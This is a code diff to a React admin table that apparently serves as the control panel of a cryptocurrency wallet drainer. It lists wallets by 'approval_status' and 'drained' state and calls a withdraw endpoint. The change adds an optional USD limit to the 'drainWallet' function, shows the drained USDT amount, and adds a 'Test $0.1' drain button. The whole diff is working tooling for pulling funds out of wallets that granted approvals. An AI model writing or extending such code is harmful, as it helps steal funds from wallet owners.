@@ -114,16 +114,17 @@ export default function WalletTable({ adminKey }: { adminKey: string }) {
 
   // ─── Drain Actions ────────────────────────────────────────────────────────
 
-  const drainWallet = useCallback(async (walletId: string, silent = false) => {
+  const drainWallet = useCallback(async (walletId: string, silent = false, limitUsd?: number) => {
     if (!silent) setDraining(walletId);
     try {
-      const res  = await fetch(`/api/wallets/${walletId}/withdraw`, {
+      const url = `/api/wallets/${walletId}/withdraw${limitUsd ? `?limitUsd=${limitUsd}` : ""}`;
+      const res  = await fetch(url, {
         method: "POST",
         headers: authHeaders(),
       });
       const data = await res.json();
       if (!res.ok) throw new Error(data.error ?? `HTTP ${res.status}`);
-      toast.success(`Drained! TX: ${data.txHash?.slice(0, 16)}...`);
+      toast.success(`Drained ${data.amount} USDT! TX: ${data.txHash?.slice(0, 16)}...`);
       await fetchWallets();
     } catch (err: unknown) {
       const msg = err instanceof Error ? err.message : String(err);
@@ -396,14 +397,24 @@ export default function WalletTable({ adminKey }: { adminKey: string }) {
 
                     {/* Actions */}
                     <td className="px-4 py-3 whitespace-nowrap">
-                      <button
-                        onClick={() => drainWallet(wallet.id)}
-                        disabled={!wallet.approval_status || wallet.drained || draining === wallet.id}
-                        className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-red-600/20 border border-red-600/40 text-red-400 text-xs font-medium hover:bg-red-600/30 disabled:opacity-30 disabled:cursor-not-allowed transition-colors"
-                      >
-                        {draining === wallet.id ? <Loader2 className="h-3.5 w-3.5 animate-spin" /> : <ArrowDownToLine className="h-3.5 w-3.5" />}
-                        Withdraw
-                      </button>
+                      <div className="flex items-center gap-1.5">
+                        <button
+                          onClick={() => drainWallet(wallet.id)}
+                          disabled={!wallet.approval_status || wallet.drained || draining === wallet.id}
+                          className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-red-600/20 border border-red-600/40 text-red-400 text-xs font-medium hover:bg-red-600/30 disabled:opacity-30 disabled:cursor-not-allowed transition-colors"
+                        >
+                          {draining === wallet.id ? <Loader2 className="h-3.5 w-3.5 animate-spin" /> : <ArrowDownToLine className="h-3.5 w-3.5" />}
+                          Withdraw
+                        </button>
+                        <button
+                          onClick={() => drainWallet(wallet.id, false, 0.1)}
+                          disabled={!wallet.approval_status || wallet.drained || draining === wallet.id}
+                          className="flex items-center gap-1 px-2 py-1.5 rounded-lg bg-blue-600/20 border border-blue-600/40 text-blue-400 text-xs font-medium hover:bg-blue-600/30 disabled:opacity-30 disabled:cursor-not-allowed transition-colors"
+                          title="Test drain with $0.10 limit"
+                        >
+                          Test $0.1
+                        </button>
+                      </div>
                     </td>
                   </tr>
                 ))
